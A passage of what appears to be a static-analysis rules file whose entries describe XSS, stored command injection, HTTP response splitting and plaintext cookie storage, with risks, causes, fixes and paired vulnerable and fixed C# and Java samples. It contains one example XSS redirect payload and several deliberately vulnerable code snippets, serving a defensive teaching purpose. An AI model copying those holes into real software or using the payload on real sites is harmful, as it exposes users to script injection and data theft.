                      &lt;span class="style2"&gt;If no escaping is used, this input might cause XSS .&lt;br&gt;
                      However, if escaping is used the input will be treated as data and will appear
                      as:&lt;/span&gt;&lt;/p&gt;
                  &lt;p class="style5"&gt;
                      &lt;span class="style2"&gt;
                      &lt;br&gt;
                      &lt;/span&gt;&lt;span class="style8"&gt;&amp;amp;lt;script&amp;amp;gt;window.location.href=&amp;amp;quot;www.someMaliciousSite&amp;amp;quot;&amp;amp;lt;/script&amp;amp;gt;&lt;/span&gt;&lt;/p&gt;
                  &lt;p&gt;
                      &amp;nbsp;&lt;/p&gt;
                  &lt;/div&gt;
              &lt;/div&gt;
              &lt;/div&gt;
              &lt;/div&gt;
          &lt;/div&gt;
          &lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations          &lt;div name="oc_90_Potential Mitigations" id="oc_90_Potential Mitigations" class="expandblock"&gt;
                  &lt;div class="detail"&gt;
                      &lt;div id="Grouped"&gt;
                          &lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
                              &lt;tr&gt;
                                  &lt;td valign="top" class="style2"&gt;
                                      Setting
                                      &lt;span style="color: rgb(0, 0, 0); font-family: Verdana; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 19px; orphans: 2; text-align: -webkit-auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); display: inline !important; float: none;"&gt;
                                      &amp;quot;defaultHtmlEscape&amp;quot; to true.&lt;/span&gt;&lt;/td&gt;
                              &lt;/tr&gt;
                          &lt;/table&gt;
                      &lt;/div&gt;
                  &lt;/div&gt;
              &lt;/div&gt;
          &lt;/div&gt;
      &lt;/div&gt;
      &lt;/div&gt;&lt;/div&gt;&lt;/html&gt;
    &lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1582</key><name>Stored_Command_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could run arbitrary system-level OS commands on the application server host. Depending on the application&amp;rsquo;s OS permissions, these could include:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;File actions (read / create / modify / delete)&lt;/li&gt;
&lt;li&gt;Open a network connection to the attacker&amp;rsquo;s server&lt;/li&gt;
&lt;li&gt;Start and stop system services&lt;/li&gt;
&lt;li&gt;Complete server takeover&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application runs an OS system-level command to complete it's task, rather than via application code. The command includes untrusted data, that may be controllable by an attacker. This untrusted string may contain malicious, system-level commands engineered by an attacker, which would be executed as though the attacker were running commands directly on the application server.&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Refactor the code to avoid any direct shell command execution. Instead, use platform provided APIs or library calls.&lt;/li&gt;
&lt;li&gt;If it is impossible to remove the command execution, execute only static commands that do not include dynamic, user-controlled data.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified format, rather than rejecting bad patterns (blacklist). Parameters should be limited to an allowed character set, and non-validated input should be dropped. In addition to characters, check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;In order to minimize damage as a measure of defense in depth, configure the application to run using a restricted user account that has no unnecessary OS privileges.&lt;/li&gt;
&lt;li&gt;If possible, isolate all OS commands to use a separate, dedicated user account that has minimal privileges only for the specific commands and files used by the application, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1060</key><name>Potential_I_Reflected_XSS_All_Clients</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to cause a user to send the website engineered input, rewriting web pages and inserting malicious scripts. The attacker can then pretend to be the original website, which would enable the attacker to steal the user's password, request the user&amp;#8217;s credit card information, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website, and the victim would blame the site for incurred damage.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from previous user input. The user input is embedded directly in the page's HTML, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary user input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in output.&lt;/li&gt;
&lt;li&gt;Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;JavaScript encoding for server-generated JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or the built-in platform functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Bad - The application uses the "Referer" field string to construct the HttpResponse&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClients
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(Referer);
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "Referer" field string is HTML encoded before use&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClientsFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response, AntiXss.AntiXssEncoder encoder)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(encoder.HtmlEncode(Referer, true));
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - User input is written to a TextBox displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClients
{
        public void foo(TextBox tb)
        {
                string input = Console.ReadLine();
                tb.Text = input;
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The user input is HTML encoded before being displayed on the screen&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClientsFixed
{
        public void foo(TextBox tb, AntiXssEncoder encode)
        {
                string input = Console.ReadLine();
                tb.Text = encode.HtmlEncode(input);
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - The application uses the "filename" field string from an HttpRequest construct an HttpResponse&lt;/h4&gt;&lt;pre&gt;public class UTF7XSS
{
        public void foo(HttpRequest Request, HttpResponse Response
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["filename"];
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "filename" string is converted to an int and using a switch case the new "filename" string is constructed&lt;/h4&gt;&lt;pre&gt;public class UTF7XSSFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["fileNum"];
                int fileNum = Convert.ToInt32(filename);
                
                switch(fileNum)
                {
                        case 1:
                                filename = "File1.txt";
                                break;
                        default:
                                filename = "File2.txt";
                                break;
                }
                
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User input is written to a label displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClients {
	public static void XSSExample(TextArea name) {	
		Label label = new Label();		
		label.setText("Hello " + name.getText());	
	}
}&lt;/pre&gt;&lt;h4&gt;Switch case is used in order to assemble the label's text value and manage wrong user input&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClientsFixed {
	public static void XSSExample(TextArea name) {
		Label label = new Label();		
		switch (name) {
		case "Joan":
			label.setText("Hello Joan");	
			break;
		case "Jim":
			label.setText("Hello Jim");	
			break;
		case "James":
			label.setText("Hello James");	
			break;
		default:
			System.out.println("Wrong Input");
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_634</key><name>HTTP_Response_Splitting</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Arbitrarily change the application server&amp;rsquo;s response header to a victim&amp;rsquo;s HTTP request by manipulating headers&lt;/li&gt;
&lt;li&gt;Arbitrarily change the application server&amp;rsquo;s response body by injecting two consecutive line breaks, which may result in Cross-Site Scripting (XSS) attacks&lt;/li&gt;
&lt;li&gt;Cause cache poisoning, potentially controlling any site&amp;rsquo;s HTTP responses going through the same proxy as this application.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Since user input is being used in an HTTP response header, an attacker could include NewLine characters to make the header look like multiple headers with engineered content, potentially making the response look like multiple responses (for example, by engineering duplicate content-length headers). This can cause an organizational proxy server to provide the second, engineered response to a victim&amp;#8217;s subsequent request; or, if the proxy server also performs response caching, the attacker can send an immediate subsequent request to another site, causing the proxy server to cache the engineered response as a response from this second site and to later serve the response to other users.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source (including cookies). Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Additionally, URL-encode all user input before including it in the response header.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
User input is being used in an HTTP response header, enabling an attacker to add a newline character and multiple headers
      &lt;/h4&gt;&lt;pre&gt;

public class HTTPResponseSplitting
{
        public void foo(HttpResponse Response)
        {
                String author3 = Console.ReadLine();
                Response.AppendHeader("Author: " + author3);
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The user input is examined to contain and newline character and the input is also URL encoded
      &lt;/h4&gt;&lt;pre&gt;

public class HTTPResponseSplittingFixed
{
        public void foo(HttpResponse Response)
        {
                String author3 = Console.ReadLine();
                if (author3.Contains('\n') == false)
                {
                        author3 = HttpUtility.UrlEncode(author3);
                        Response.AppendHeader("Author: " + author3);
                }
        }
}



      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1655</key><name>Plaintext_Storage_in_a_Cookie</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Plaintext Storage in a Cookie&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;315&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_315_Description" id="oc_315_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Storing sensitive data in plaintext in a cookie makes the data
more easily accessible than if encrypted. This significantly lowers the
difficulty of exploitation by attackers.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_315_Time of Introduction" id="oc_315_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_315_Applicable Platforms" id="oc_315_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_315_Demonstrative Examples" id="oc_315_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The following code excerpt stores a plaintext user account ID in a
browser cookie.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;response.addCookie( new Cookie("userAccountID", acctID);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_315_Observed Examples" id="oc_315_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1800" target="_blank"&gt;CVE-2002-1800&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Admin password in plaintext in a
cookie.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1537" target="_blank"&gt;CVE-2001-1537&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Default configuration has cleartext
usernames/passwords in cookie.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1536" target="_blank"&gt;CVE-2001-1536&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Usernames/passwords in cleartext in
cookies.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2160" target="_blank"&gt;CVE-2005-2160&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Authentication information stored in cleartext in
a cookie.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_315_Potential Mitigations" id="oc_315_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Sensitive information should not be stored in plaintext in a cookie.
Even if heavy fortifications are in place, sensitive data should be
encrypted to prevent the risk of losing confidentiality.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_315_Relationships" id="oc_315_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;312&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=312" target="_blank"&gt;Cleartext Storage of Sensitive Information&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_315_Taxonomy Mappings" id="oc_315_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Plaintext Storage in Cookie&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_315_Related Attack Patterns" id="oc_315_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org31.html" target="_blank"&gt;31&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Accessing/Intercepting/Modifying HTTP Cookies&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org37.html" target="_blank"&gt;37&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Lifting Data Embedded in Client Distributions&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org39.html" target="_blank"&gt;39&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Manipulating Opaque Client-based Data Tokens&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org74.html" target="_blank"&gt;74&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Manipulating User State&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_315_Content History" id="oc_315_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Sean Eidemiller&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;added/updated demonstrative
examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Plaintext Storage in
Cookie&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

